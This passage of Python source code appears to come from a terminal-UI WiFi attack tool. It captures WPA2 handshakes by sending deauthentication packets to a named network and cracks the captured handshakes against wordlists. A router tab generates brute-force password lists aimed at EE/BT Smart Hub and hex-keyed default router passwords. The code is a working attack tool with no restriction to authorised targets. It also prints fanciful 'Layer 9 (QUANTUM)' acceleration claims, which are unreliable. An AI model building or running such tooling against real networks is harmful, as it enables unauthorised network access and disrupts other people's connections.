                import traceback
                log.write(f"[red]Error: {str(e)}[/]")
                log.write(f"[red]Traceback: {traceback.format_exc()}[/]")
                monitor.set_status("Error occurred")

        threading.Thread(target=scan_worker, daemon=True).start()

    def capture_handshake(self):
        """Capture WiFi handshake"""
        log = self.query_one("#wifi_log", MarkupLog)
        monitor = self.query_one("#wifi_progress", ProgressMonitor)
        try:
            target_input = self.query_one("#target_ssid", Input)
        except Exception:
            log.write("[red]❌ UI not ready. Please wait for interface to load[/]")
            return

        target_ssid = target_input.value.strip()
        if not target_ssid:
            log.write("[red]❌ Please select a target network first[/]")
            log.write("[yellow]💡 Use '1. SCAN NETWORKS' to find networks, then select one from the list or enter SSID manually[/]")
            return

        # Get and validate deauth configuration
        try:
            deauth_count_input = self.query_one("#deauth_count", Input)
            deauth_count = int(deauth_count_input.value or "5")
            if not (1 <= deauth_count <= 100):
                log.write("[red]Error: Deauth count must be between 1 and 100[/]")
                monitor.set_status("Invalid deauth count")
                return
        except ValueError:
            log.write("[red]Error: Deauth count must be a valid number[/]")
            monitor.set_status("Invalid deauth count")
            return

        # Get and validate capture duration
        try:
            capture_duration_input = self.query_one("#capture_duration", Input)
            capture_duration = int(capture_duration_input.value or "60")
            if not (10 <= capture_duration <= 300):
                log.write("[red]Error: Capture duration must be between 10 and 300 seconds[/]")
                monitor.set_status("Invalid capture duration")
                return
        except ValueError:
            log.write("[red]Error: Capture duration must be a valid number[/]")
            monitor.set_status("Invalid capture duration")
            return

        # Check root privileges
        if os.geteuid() != 0:
            log.write("[red]Error: Root privileges required for handshake capture[/]")
            log.write("[yellow]Run with: sudo -E ./wifucker[/]")
            monitor.set_status("Root required")
            return

        log.write("[cyan]Handshake capture configuration:[/]")
        log.write(f"  [yellow]Target:[/] {target_ssid}")
        log.write(f"  [yellow]Deauth packets:[/] {deauth_count}")
        log.write(f"  [yellow]Capture duration:[/] {capture_duration} seconds")
        log.write("[cyan]Starting handshake capture...[/]")

        def capture_worker():
            try:
                import os
                if os.geteuid() != 0:
                    log.write("[red]Error: Root privileges required for handshake capture[/]")
                    log.write("[yellow]Run with: sudo -E ./wifucker[/]")
                    monitor.set_status("Root required")
                    return

                # Import with graceful fallback
                try:
                    from .capture.handshake_capture import HandshakeCapture
                    from .capture.network_scanner import NetworkScanner
                except ImportError as e:
                    log.write(f"[red]Error importing capture modules: {e}[/]")
                    log.write("[yellow]Please ensure all capture modules are available[/]")
                    monitor.set_status("Import error")
                    return

                # Detect interface with error handling
                import subprocess
                try:
                    result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=10)
                    if result.returncode != 0:
                        log.write("[yellow]iwconfig failed, trying alternative methods...[/]")
                        interfaces = []
                    else:
                        interfaces = [line.split()[0] for line in result.stdout.split('\n') if 'IEEE 802.11' in line]
                except (FileNotFoundError, subprocess.TimeoutExpired) as e:
                    log.write(f"[yellow]iwconfig not available: {e}[/]")
                    interfaces = []

                if not interfaces:
                    # Try alternative interface detection
                    try:
                        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            for line in result.stdout.split('\n'):
                                if 'Interface' in line:
                                    iface = line.split()[-1]
                                    if iface:
                                        interfaces.append(iface)
                    except:
                        pass
                    
                    if not interfaces:
                        log.write("[red]No WiFi interfaces found[/]")
                        log.write("[yellow]Troubleshooting:[/]")
                        log.write("  1. Ensure wireless adapter is connected")
                        log.write("  2. Check: ip link show")
                        log.write("  3. Enable wireless: rfkill unblock wifi")
                        monitor.set_status("No interface")
                        return

                interface = interfaces[0]
                log.write(f"[cyan]Using interface: {interface}[/]")

                # Scan to get network details with error handling
                try:
                    scanner = NetworkScanner(interface)
                    networks = scanner.scan(duration=5)
                except Exception as e:
                    log.write(f"[yellow]Network scan failed: {e}[/]")
                    log.write("[yellow]Continuing with manual capture...[/]")
                    networks = []
                
                target_network = None
                for net in networks:
                    if net.essid == target_ssid:
                        target_network = net
                        break

                if not target_network:
                    log.write(f"[yellow]Network '{target_ssid}' not found in scan, using manual capture[/]")
                    # Create a basic network object for manual capture
                    from .capture.network_scanner import WiFiNetwork
                    target_network = WiFiNetwork(
                        bssid="00:00:00:00:00:00",  # Will be detected during capture
                        essid=target_ssid,
                        channel=1,
                        power=-50,
                        encryption="WPA2",
                        cipher="",
                        authentication=""
                    )

                # Initialize capture with error handling
                try:
                    # Ensure output directory exists
                    output_dir = Path("./captures")
                    output_dir.mkdir(exist_ok=True)
                    
                    capture = HandshakeCapture(interface=interface, output_dir=str(output_dir))
                    monitor.set_status("Initializing capture...")
                    log.write(f"[cyan]Capturing handshake for {target_ssid}...[/]")
                    log.write(f"[yellow]Capture duration: {capture_duration} seconds[/]")
                    log.write(f"[yellow]Deauth packets: {deauth_count}[/]")
                    log.write("[cyan]Starting capture process...[/]")
                    
                    # Start progress update thread
                    import time
                    progress_thread_running = [True]
                    
                    def progress_updater():
                        elapsed = 0
                        while progress_thread_running[0] and elapsed < capture_duration:
                            time.sleep(1)
                            elapsed += 1
                            remaining = capture_duration - elapsed
                            if remaining > 0:
                                monitor.set_status(f"Capturing... {remaining}s remaining")
                                if elapsed % 5 == 0:
                                    log.write(f"[cyan]Capture in progress... {remaining}s remaining[/]")
                    
                    progress_thread = threading.Thread(target=progress_updater, daemon=True)
                    progress_thread.start()

                    # Capture handshake with correct parameters
                    result = capture.capture_handshake(
                        target=target_network,
                        capture_duration=capture_duration,
                        deauth_count=deauth_count
                    )
                    
                    # Stop progress thread
                    progress_thread_running[0] = False
                except Exception as e:
                    log.write(f"[red]Capture initialization failed: {e}[/]")
                    log.write("[yellow]Please ensure:[/]")
                    log.write("  1. Interface is in monitor mode")
                    log.write("  2. You have root privileges")
                    log.write("  3. Required tools are installed (airodump-ng)")
                    monitor.set_status("Capture failed")
                    return

                if result and result.success:
                    log.write(f"[green]✓ Handshake captured successfully![/]")
                    log.write(f"[green]PCAP file: {result.pcap_file}[/]")
                    log.write(f"[green]Handshakes: {result.handshakes_captured}[/]")
                    log.write(f"[cyan]Duration: {result.duration:.1f}s[/]")
                    log.write("[yellow]You can now use 'Crack Password' with this PCAP file[/]")
                    
                    # Auto-fill PCAP file path with error handling
                    try:
                        pcap_input = self.query_one("#pcap_file", Input)
                        if not pcap_input.value and hasattr(result, 'pcap_file'):
                            pcap_input.value = result.pcap_file
                    except Exception:
                        pass  # Widget might not exist yet
                    
                    monitor.set_status(f"Captured: {result.pcap_file}")
                else:
                    error_msg = result.message if result and hasattr(result, 'message') else "Unknown error"
                    log.write(f"[red]Capture failed: {error_msg}[/]")
                    log.write("[yellow]Tips:[/]")
                    log.write("  - Ensure target network has active clients")
                    log.write(f"  - Try increasing capture duration (current: {capture_duration}s) or deauth packets (current: {deauth_count})")
                    log.write("  - Check interface is in monitor mode")
                    log.write("  - Verify you have root privileges")
                    log.write("  - Try scanning again to refresh network information")
                    monitor.set_status("Capture failed")

            except ImportError as e:
                log.write(f"[red]Import error: {e}[/]")
                log.write("[yellow]Capture module not available[/]")
                monitor.set_status("Module missing")
            except Exception as e:
                log.write(f"[red]Error: {str(e)}[/]")
                import traceback
                log.write(f"[red]{traceback.format_exc()}[/]")
                monitor.set_status("Error occurred")

        threading.Thread(target=capture_worker, daemon=True).start()

    def start_wifi_cracking(self):
        """Start WiFi password cracking"""
        try:
            pcap_input = self.query_one("#pcap_file", Input)
            wordlist_input = self.query_one("#wordlist_file", Input)
            target_input = self.query_one("#target_ssid", Input)
            log = self.query_one("#wifi_log", MarkupLog)
            monitor = self.query_one("#wifi_progress", ProgressMonitor)
        except Exception as e:
            print(f"Error accessing widgets: {e}")
            return

        pcap_file = pcap_input.value.strip() if pcap_input.value else ""
        wordlist_file = wordlist_input.value.strip() if wordlist_input.value else ""

        if not pcap_file:
            log.write("[red]Error: Enter PCAP file path[/]")
            log.write("[yellow]Use 'Browse PCAP' button or enter path manually[/]")
            monitor.set_status("PCAP file missing")
            return

        pcap_path = Path(pcap_file)
        if not pcap_path.exists():
            log.write(f"[red]Error: PCAP file not found: {pcap_file}[/]")
            log.write("[yellow]Please check the file path and try again[/]")
            monitor.set_status("File not found")
            return
        
        if not pcap_path.is_file():
            log.write(f"[red]Error: Path is not a file: {pcap_file}[/]")
            monitor.set_status("Invalid file")
            return
        
        if not os.access(pcap_file, os.R_OK):
            log.write(f"[red]Error: Cannot read PCAP file: {pcap_file}[/]")
            log.write("[yellow]Check file permissions[/]")
            monitor.set_status("Permission denied")
            return

        if not wordlist_file:
            # Try rockyou
            rockyou_path = Path.home() / "rockyou" / "rockyou.txt"
            if rockyou_path.exists() and rockyou_path.is_file():
                try:
                    # Verify file is readable
                    with open(rockyou_path, 'r') as f:
                        f.read(1)  # Try to read at least 1 byte
                    wordlist_file = str(rockyou_path)
                    wordlist_input.value = wordlist_file
                    log.write(f"[cyan]Using rockyou.txt: {wordlist_file}[/]")
                except (IOError, PermissionError) as e:
                    log.write(f"[yellow]Cannot read rockyou.txt: {e}[/]")
                    log.write("[red]Error: Enter wordlist file path[/]")
                    monitor.set_status("Wordlist unreadable")
                    return
            else:
                log.write("[red]Error: Enter wordlist file path[/]")
                log.write("[yellow]Download rockyou.txt from Tools tab or specify a wordlist[/]")
                monitor.set_status("Wordlist missing")
                return

        wordlist_path = Path(wordlist_file)
        if not wordlist_path.exists():
            log.write(f"[red]Error: Wordlist file not found: {wordlist_file}[/]")
            monitor.set_status("Wordlist not found")
            return
        
        if not wordlist_path.is_file():
            log.write(f"[red]Error: Path is not a file: {wordlist_file}[/]")
            monitor.set_status("Invalid wordlist")
            return
        
        if not os.access(wordlist_file, os.R_OK):
            log.write(f"[red]Error: Cannot read wordlist file: {wordlist_file}[/]")
            monitor.set_status("Wordlist permission denied")
            return

        monitor.set_status("Parsing PCAP...")
        log.write(f"[cyan]Parsing PCAP: {pcap_file}[/]")

        def crack_worker():
            try:
                # Import with graceful fallback
                try:
                    from .parsers.pcap_parser import PCAPParser
                    from crackers.openvino_cracker import OpenVINOWiFiCracker
                except ImportError as e:
                    log.write(f"[red]Error importing modules: {e}[/]")
                    log.write("[yellow]Please ensure all required modules are available[/]")
                    monitor.set_status("Import error")
                    return

                # Parse PCAP with error handling
                try:
                    parser = PCAPParser(pcap_file)
                    handshakes, pmkids = parser.parse()
                except Exception as e:
                    self.app.show_user_friendly_error(log, e, "wifi",
                        ["Verify PCAP file contains valid WPA/WPA2 handshakes", "Capture handshake again if file is corrupted"])
                    monitor.set_status("PCAP parse error")
                    return

                if not handshakes:
                    log.write("[red]No handshakes found in PCAP file[/]")
                    monitor.set_status("No handshake found")
                    return

                log.write(f"[green]Found {len(handshakes)} handshake(s)[/]")

                # Select handshake
                target_ssid = target_input.value.strip()
                if target_ssid:
                    target_hs = next((hs for hs in handshakes if hs.ssid == target_ssid), None)
                    if not target_hs:
                        log.write(f"[yellow]SSID '{target_ssid}' not found, using first handshake[/]")
                        target_hs = handshakes[0]
                else:
                    target_hs = handshakes[0]

                log.write(f"[cyan]Target: {target_hs.ssid} ({target_hs.bssid})[/]")
                log.write(f"[cyan]Handshake type: {target_hs.handshake_type}[/]")

                # Initialize cracker with full Layer 9 permissions
                monitor.set_status("Initializing cracker with Layer 9 (QUANTUM)...")
                log.write("[cyan]Initializing hardware-accelerated cracker...[/]")
                log.write("[green]Layer 9 (QUANTUM) clearance: ACTIVE[/]")
                log.write("[cyan]Routing through: Quantum → Unified Accelerators → Hardware[/]")
                
                try:
                    cracker = OpenVINOWiFiCracker(use_hardware=True)
                except Exception as e:
                    log.write(f"[yellow]Hardware acceleration init failed: {e}[/]")
                    log.write("[yellow]Falling back to CPU-only mode...[/]")
                    try:
                        cracker = OpenVINOWiFiCracker(use_hardware=False)
                    except Exception as e2:
                        log.write(f"[red]Cracker initialization failed: {e2}[/]")
                        monitor.set_status("Init failed")
                        return

                # Log acceleration stack
                if cracker.use_quantum:
                    log.write(f"[green]✓ Quantum Processor: ENABLED (Layer 9)[/]")
                if cracker.use_unified_accel:
                    log.write(f"[green]✓ Unified Accelerator: {cracker.total_tops:.1f} TOPS[/]")
                    if cracker.unified_manager:
                        stats = cracker.unified_manager.get_stats()
                        for accel_name, accel_stats in stats["accelerators"].items():
                            log.write(f"  - {accel_name.upper()}: {accel_stats['tops']:.1f} TOPS")
                elif cracker.use_hardware and cracker.primary_device:
                    log.write(f"[yellow]Standard Hardware: {cracker.primary_device.device_name}[/]")

                # Show effective TOPS with Layer 9
                quantum_speedup = 1.5 if cracker.use_quantum else 1.0
                effective_tops = (cracker.total_tops if cracker.use_unified_accel else 0) * quantum_speedup
                if effective_tops > 0:
                    log.write(f"[bold cyan]Effective TOPS (with Layer 9): {effective_tops:.1f}[/]")

                # Throttle progress updates to reduce UI lag
                last_update_time = [0]
                update_interval = 0.5  # Update every 0.5 seconds
                
                def progress_callback(tested, total, percent, rate):
                    import time
                    current_time = time.time()
                    if current_time - last_update_time[0] >= update_interval:
                        monitor.update_progress(tested, total, percent, rate)
                        last_update_time[0] = current_time
                        if tested % 1000 == 0:
                            log.write(f"[cyan]Tested: {tested:,} / {total:,} ({percent:.1f}%) - {rate:,.0f} pwd/sec[/]")

                # Crack with full Layer 9 acceleration stack
                monitor.set_status("Cracking WPA2/PSK2 with Layer 9 (QUANTUM)...")
                log.write("[bold cyan]═══════════════════════════════════════════════════════════[/]")
                log.write("[bold green]WPA2/PSK2 CRACKING - FULL 9-LAYER ACCELERATION STACK[/]")
                log.write("[bold cyan]═══════════════════════════════════════════════════════════[/]")
                log.write("[green]Layer 9 (QUANTUM) Clearance: ACTIVE[/]")
                log.write("[cyan]Routing through all acceleration layers...[/]")

                # Show routing path
                routing_path = []
                if cracker.use_quantum:
                    routing_path.append("Quantum Processor (Layer 9)")
                if cracker.use_unified_accel:
                    routing_path.append(f"Unified Accelerators ({cracker.total_tops:.1f} TOPS)")
                elif cracker.use_hardware:
                    routing_path.append(f"Hardware ({cracker.primary_device.device_name if cracker.primary_device else 'CPU'})")
                else:
                    routing_path.append("CPU")

                log.write(f"[cyan]Routing: {' → '.join(routing_path)}[/]")

                result = cracker.crack_handshake(
                    ssid=target_hs.ssid,
                    anonce=target_hs.anonce,
                    snonce=target_hs.snonce,
                    mic=target_hs.mic,
                    bssid=target_hs.bssid,
                    client=target_hs.client,
                    wordlist_file=wordlist_file,
                    progress_callback=progress_callback
                )

                if result.success:
                    log.write(f"[bold green]✓ SUCCESS![/]")
                    log.write(f"[green]Password: {result.password}[/]")
                    log.write(f"[cyan]Device Used: {result.device_used}[/]")
                    log.write(f"[cyan]Attempts: {result.attempts:,}[/]")
                    log.write(f"[cyan]Time: {result.elapsed_time:.2f}s[/]")
                    log.write(f"[cyan]Rate: {result.hashes_per_second:,.0f} hashes/sec[/]")

                    # Show Layer 9 performance if quantum was used
                    if "QUANTUM" in result.device_used or "Quantum" in result.device_used:
                        log.write(f"[bold cyan]Layer 9 (QUANTUM) acceleration: ACTIVE[/]")

                    monitor.set_status(f"SUCCESS: {result.password}")
                else:
                    log.write(f"[yellow]Password not found in wordlist[/]")
                    log.write(f"[cyan]Tested: {result.attempts:,} passwords[/]")
                    log.write(f"[cyan]Time: {result.elapsed_time:.2f}s[/]")
                    monitor.set_status("Not found")

            except Exception as e:
                log.write(f"[red]Error: {str(e)}[/]")
                import traceback
                log.write(f"[red]{traceback.format_exc()}[/]")
                monitor.set_status("Error occurred")

        threading.Thread(target=crack_worker, daemon=True).start()


class RouterCrackingTab(Container):
    """Dedicated Router Password Cracking Interface"""

    def compose(self) -> ComposeResult:
        yield Vertical(
            # Header
            Label("[bold white]Router Password Cracking[/]"),
            Label("[cyan]Specialized tools for router default passwords[/]"),

            # Quick Access Section
            Label("[yellow]Quick Router Cracking:[/]"),
            Horizontal(
                Button("🔥 EE WiFi Smart Crack", id="ee_smart_crack", variant="error",
                      tooltip="One-click EE Smart Hub cracking with auto-detection"),
                Button("⚡ Router Hex Blitz", id="hex_blitz", variant="primary",
                      tooltip="Fast 10-digit hex brute force for technical routers"),
                Button("🎯 Pattern Storm", id="pattern_storm", variant="success",
                      tooltip="Multi-pattern attack: hex, numeric, brand combinations"),
                Button("🔍 Smart Detect & Crack", id="smart_detect_crack", variant="warning",
                      tooltip="Analyze SSID and auto-select optimal cracking strategy"),
            ),

            # Router Type Selection
            Label("[cyan]Router Type Selection:[/]"),
            RadioSet(
                RadioButton("🔐 Generic Router (8-12 chars)", id="generic_router", value=True),
                RadioButton("📱 EE/BT Smart Hub (12-14 digits)", id="ee_smart_hub"),
                RadioButton("⚙️ Technical Device (10-digit hex)", id="tech_device"),
                RadioButton("🌐 Auto-Detect from SSID", id="auto_detect"),
                id="router_type_select"
            ),

            # Target Configuration
            Vertical(
                Label("[yellow]Target Configuration:[/]"),
                Input(id="router_ssid", placeholder="Enter router SSID (e.g., EE-BrightBox-123)",
                      tooltip="Router network name for pattern optimization"),
                Input(id="router_wordlist_size", value="5000", placeholder="Wordlist size (1000-50000)",
                      tooltip="Number of passwords to generate"),
                Horizontal(
                    Button("📊 Analyze Router", id="analyze_router", tooltip="Analyze SSID for router intelligence"),
                    Button("📝 Generate Wordlist", id="generate_router_list", variant="success"),
                    Button("💾 Save Wordlist", id="save_router_list", variant="primary"),
                ),
                id="router_config"
            ),

            # Router Intelligence Panel
            Vertical(
                Label("[yellow]Router Intelligence:[/]"),
                Static("", id="router_analysis", markup=True),
                Static("", id="wordlist_stats", markup=True),
                id="router_intel_panel"
            ),

            # Results and Preview
            Label("[green]Generated Passwords Preview:[/]"),
            ScrollableContainer(
                Static("", id="password_preview", markup=True),
                id="preview_container",
                classes="preview-container"
            ),

            # Progress and Actions
            Label("[cyan]Operations:[/]"),
            ProgressMonitor(id="router_progress"),
            MarkupLog(id="router_log", highlight=True, max_lines=2000),

            id="router_cracking_container"
        )

    def on_mount(self) -> None:
        """Initialize the router cracking tab"""
        # Set default radio button
        radio_set = self.query_one("#router_type_select", RadioSet)
        if radio_set:
            radio_set.pressed = "ee_smart_hub"  # Default to EE WiFi

    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses"""
        log = self.query_one("#router_log", MarkupLog)

        if event.button.id == "ee_smart_crack":
            self.ee_smart_crack()
        elif event.button.id == "hex_blitz":
            self.hex_blitz_crack()
        elif event.button.id == "pattern_storm":
            self.pattern_storm_crack()
        elif event.button.id == "smart_detect_crack":
            self.smart_detect_crack()
        elif event.button.id == "analyze_router":
            self.analyze_router()
        elif event.button.id == "generate_router_list":
            self.generate_router_wordlist()
        elif event.button.id == "save_router_list":
            self.save_router_wordlist()

    def ee_smart_crack(self):
        """One-click EE Smart Hub cracking"""
        log = self.query_one("#router_log", MarkupLog)
        monitor = self.query_one("#router_progress", ProgressMonitor)

        log.write("[bold cyan]🚀 EE SMART CRACK ACTIVATED[/]")
        log.write("[cyan]Target: EE/BT Smart Hub networks[/]")
        log.write("[green]Pattern: 12-14 digit numeric combinations[/]")
        log.write("[cyan]Generating comprehensive EE password list...[/]")

        monitor.set_status("Generating EE patterns...")

        try:
            from .crackers.ee_wifi_cracker import EEWiFiCracker

            # Generate comprehensive EE wordlist
            wordlist = EEWiFiCracker.generate_all_patterns(10000)

            monitor.set_status(f"Generated {len(wordlist)} EE passwords")

            log.write(f"[green]✓ Generated {len(wordlist):,} EE WiFi passwords[/]")
            log.write("[cyan]Pattern types included:[/]")
            log.write("  • Sequential numbers (123456789012, 987654321098)")
            log.write("  • Repeated digits (111111111111, 222222222222)")
            log.write("  • Pattern repeats (123123123123, 456456456456)")
            log.write("  • Brand combinations (EEBrightBox2024, BrightBoxEE123)")

            # Save wordlist
            wordlist_file = ROOT_DIR / "ee_smart_crack_wordlist.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Wordlist saved: {wordlist_file}[/]")
            log.write("[bold green]🎯 READY FOR EE WIFI CRACKING![/]")
            log.write("[cyan]Use this wordlist in the WiFi Operations tab[/]")

            monitor.set_status("EE crack ready")

        except Exception as e:
            log.write(f"[red]EE Smart Crack failed: {e}[/]")
            monitor.set_status("Error")

    def hex_blitz_crack(self):
        """Fast 10-digit hex brute force"""
        log = self.query_one("#router_log", MarkupLog)
        monitor = self.query_one("#router_progress", ProgressMonitor)

        log.write("[bold cyan]⚡ HEX BLITZ CRACK ACTIVATED[/]")
        log.write("[cyan]Target: Technical routers and devices[/]")
        log.write("[green]Pattern: 10-digit hexadecimal (a-f, 0-9)[/]")
        log.write("[cyan]Generating optimized hex wordlist...[/]")

        monitor.set_status("Generating hex patterns...")

        try:
            from .crackers.router_cracker import RouterBruteForceCracker

            cracker = RouterBruteForceCracker()
            wordlist = cracker.generate_wordlist("Hexadecimal (10 digits)", 10000)

            monitor.set_status(f"Generated {len(wordlist)} hex passwords")

            log.write(f"[green]✓ Generated {len(wordlist):,} hex passwords[/]")
            log.write("[cyan]Charset: a-f, 0-9 (case insensitive)[/]")
            log.write("[cyan]Common patterns included: deadbeef, abcdef1234, etc.[/]")

            # Show preview
            log.write("[cyan]Sample passwords:[/]")
            for pwd in wordlist[:10]:
                log.write(f"  {pwd}")

            # Save wordlist
            wordlist_file = ROOT_DIR / "hex_blitz_wordlist.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Wordlist saved: {wordlist_file}[/]")
            log.write("[bold green]🎯 READY FOR HEX BRUTE FORCE![/]")

            monitor.set_status("Hex blitz ready")

        except Exception as e:
            log.write(f"[red]Hex Blitz failed: {e}[/]")
            monitor.set_status("Error")

    def pattern_storm_crack(self):
        """Multi-pattern attack combining various router types"""
        log = self.query_one("#router_log", MarkupLog)
        monitor = self.query_one("#router_progress", ProgressMonitor)

        log.write("[bold cyan]🎯 PATTERN STORM ACTIVATED[/]")
        log.write("[cyan]Target: All router types[/]")
        log.write("[green]Strategy: Multi-pattern combination attack[/]")
        log.write("[cyan]Generating comprehensive router wordlist...[/]")

        monitor.set_status("Generating multi-pattern...")

        try:
            from .crackers.router_cracker import RouterPasswordGenerator

            wordlist = set()

            # Generate from all available patterns
            patterns = RouterPasswordGenerator.get_available_patterns()
            passwords_per_pattern = 2000

            for pattern in patterns:
                pattern_passwords = RouterPasswordGenerator._generate_from_pattern(
                    pattern, passwords_per_pattern
                )
                wordlist.update(pattern_passwords)
                log.write(f"[cyan]Added {len(pattern_passwords)} {pattern.name} passwords[/]")

            final_wordlist = sorted(list(wordlist))[:15000]

            monitor.set_status(f"Generated {len(final_wordlist)} total passwords")

            log.write(f"[green]✓ Generated {len(final_wordlist):,} comprehensive router passwords[/]")
            log.write("[cyan]Patterns included:[/]")
            for pattern in patterns:
                log.write(f"  • {pattern.name}: {pattern.description}")

            # Save wordlist
            wordlist_file = ROOT_DIR / "pattern_storm_wordlist.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Wordlist saved: {wordlist_file}[/]")
            log.write("[bold green]🎯 READY FOR PATTERN STORM ATTACK![/]")

            monitor.set_status("Pattern storm ready")

        except Exception as e:
            log.write(f"[red]Pattern Storm failed: {e}[/]")
            monitor.set_status("Error")

    def smart_detect_crack(self):
        """Smart detection and cracking based on SSID"""
        log = self.query_one("#router_log", MarkupLog)
        monitor = self.query_one("#router_progress", ProgressMonitor)
        ssid_input = self.query_one("#router_ssid", Input)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]Error: Please enter a router SSID[/]")
            return

        log.write("[bold cyan]🔍 SMART DETECT & CRACK ACTIVATED[/]")
        log.write(f"[cyan]Analyzing SSID: {ssid}[/]")

        monitor.set_status("Analyzing SSID...")

        try:
            from .crackers.router_cracker import RouterBruteForceCracker
            from .crackers.ee_wifi_cracker import EEWiFiCracker

            # Smart detection
            if EEWiFiCracker.is_ee_network(ssid):
                log.write("[green]✓ Detected: EE/BT Smart Hub network[/]")
                wordlist = EEWiFiCracker.generate_all_patterns(8000)
                strategy = "EE WiFi patterns"
            else:
                cracker = RouterBruteForceCracker(ssid)
                detected = cracker.generator.detect_router_type(ssid)

                if detected:
                    log.write(f"[green]✓ Detected: {detected}[/]")
                    wordlist = cracker.generate_wordlist(detected, 8000)
                    strategy = detected
                else:
                    log.write("[yellow]⚠ Router type not specifically detected[/]")
                    log.write("[cyan]Using comprehensive pattern approach...[/]")
                    wordlist = cracker.generate_wordlist("Hexadecimal (10 digits)", 5000)
                    strategy = "Generic hex patterns"

            monitor.set_status(f"Generated {len(wordlist)} passwords")

            log.write(f"[green]✓ Generated {len(wordlist):,} passwords using {strategy}[/]")

            # Show sample
            log.write("[cyan]Sample passwords:[/]")
            for pwd in wordlist[:8]:
                log.write(f"  {pwd}")

            # Save wordlist
            safe_ssid = ssid.replace("-", "_").replace(" ", "_")
            wordlist_file = ROOT_DIR / f"smart_crack_{safe_ssid}.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Smart wordlist saved: {wordlist_file}[/]")
            log.write("[bold green]🎯 READY FOR SMART CRACKING![/]")

            monitor.set_status("Smart crack ready")

        except Exception as e:
            log.write(f"[red]Smart Detect & Crack failed: {e}[/]")
            monitor.set_status("Error")

    def analyze_router(self):
        """Analyze router SSID for intelligence"""
        ssid_input = self.query_one("#router_ssid", Input)
        analysis_display = self.query_one("#router_analysis", Static)
        log = self.query_one("#router_log", MarkupLog)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]Error: Please enter a router SSID[/]")
            return

        log.write(f"[cyan]Analyzing router SSID: {ssid}[/]")

        try:
            from .crackers.router_cracker import RouterPasswordGenerator
            from .crackers.ee_wifi_cracker import EEWiFiCracker

            analysis = ""

            # Check for EE network
            if EEWiFiCracker.is_ee_network(ssid):
                analysis += "[green]✓ EE/BT Network Detected[/]\n"
                analysis += "[cyan]Recommended: EE WiFi Smart Crack[/]\n"
                analysis += "[yellow]Expected patterns: 12-14 digit numbers[/]\n"
            else:
                # General router analysis
                generator = RouterPasswordGenerator()
                detected_pattern = generator.detect_router_type(ssid)

                if detected_pattern:
                    analysis += f"[green]✓ Router Type Detected: {detected_pattern}[/]\n"
                else:
                    analysis += "[yellow]⚠ Router type not auto-detected[/]\n"
                    analysis += "[cyan]Will use generic patterns[/]\n"

            # SSID characteristics
            analysis += f"\n[yellow]SSID Analysis:[/]\n"
            analysis += f"  Length: {len(ssid)} characters\n"
            analysis += f"  Contains numbers: {'Yes' if any(c.isdigit() for c in ssid) else 'No'}\n"
            analysis += f"  Contains hyphens: {'Yes' if '-' in ssid else 'No'}\n"

            # Pattern suggestions
            analysis += f"\n[cyan]Suggested Strategies:[/]\n"
            if EEWiFiCracker.is_ee_network(ssid):
                analysis += f"  • EE Smart Crack (12-14 digits)\n"
                analysis += f"  • Pattern Storm (multi-type)\n"
            else:
                analysis += f"  • Hex Blitz (10-digit hex)\n"
                analysis += f"  • Pattern Storm (comprehensive)\n"
                analysis += f"  • Smart Detect & Crack (auto)\n"

            analysis_display.update(analysis)
            log.write("[green]✓ Router analysis complete[/]")

        except Exception as e:
            log.write(f"[red]Router analysis failed: {e}[/]")
            analysis_display.update("[red]Analysis failed[/]")

    def generate_router_wordlist(self):
        """Generate wordlist based on current configuration"""
        radio_set = self.query_one("#router_type_select", RadioSet)
        ssid_input = self.query_one("#router_ssid", Input)
        size_input = self.query_one("#router_wordlist_size", Input)
        preview_display = self.query_one("#password_preview", Static)
        stats_display = self.query_one("#wordlist_stats", Static)
        log = self.query_one("#router_log", MarkupLog)

        router_type = radio_set.pressed.id if radio_set.pressed else "generic_router"
        ssid = ssid_input.value.strip() or "Unknown_Router"

        try:
            wordlist_size = int(size_input.value.strip())
            wordlist_size = max(1000, min(50000, wordlist_size))  # Clamp to reasonable range
        except ValueError:
            wordlist_size = 5000

        log.write(f"[cyan]Generating wordlist for {router_type}...[/]")
        log.write(f"[cyan]Target SSID: {ssid}[/]")
        log.write(f"[cyan]Wordlist size: {wordlist_size}[/]")

        try:
            wordlist = []

            if router_type == "ee_smart_hub":
                from .crackers.ee_wifi_cracker import EEWiFiCracker
                wordlist = EEWiFiCracker.generate_all_patterns(wordlist_size)
                pattern_desc = "EE WiFi (12-14 digits)"

            elif router_type == "tech_device":
                from .crackers.router_cracker import RouterBruteForceCracker
                cracker = RouterBruteForceCracker()
                wordlist = cracker.generate_wordlist("Hexadecimal (10 digits)", wordlist_size)
                pattern_desc = "Hexadecimal (10 digits)"

            elif router_type == "auto_detect":
                from .crackers.router_cracker import RouterBruteForceCracker
                from .crackers.ee_wifi_cracker import EEWiFiCracker

                if EEWiFiCracker.is_ee_network(ssid):
                    wordlist = EEWiFiCracker.generate_all_patterns(wordlist_size)
                    pattern_desc = "Auto-detected EE WiFi"
                else:
                    cracker = RouterBruteForceCracker(ssid)
                    detected = cracker.generator.detect_router_type(ssid)
                    if detected:
                        wordlist = cracker.generate_wordlist(detected, wordlist_size)
                        pattern_desc = f"Auto-detected {detected}"
                    else:
                        wordlist = cracker.generate_wordlist("Hexadecimal (10 digits)", wordlist_size)
                        pattern_desc = "Auto-detected Hex"

            else:  # generic_router
                from .crackers.router_cracker import RouterBruteForceCracker
                cracker = RouterBruteForceCracker()
                wordlist = cracker.generate_wordlist("Alphanumeric Router (8-12 chars)", wordlist_size)
                pattern_desc = "Generic Router (8-12 chars)"

            # Update preview
            preview_text = "[cyan]Generated Passwords Preview:[/]\n"
            for i, pwd in enumerate(wordlist[:20]):
                preview_text += f"{i+1:2d}. {pwd}\n"

            if len(wordlist) > 20:
                preview_text += f"[yellow]... and {len(wordlist)-20} more passwords[/]"

            preview_display.update(preview_text)

            # Update stats
            stats_text = f"[green]Wordlist Statistics:[/]\n"
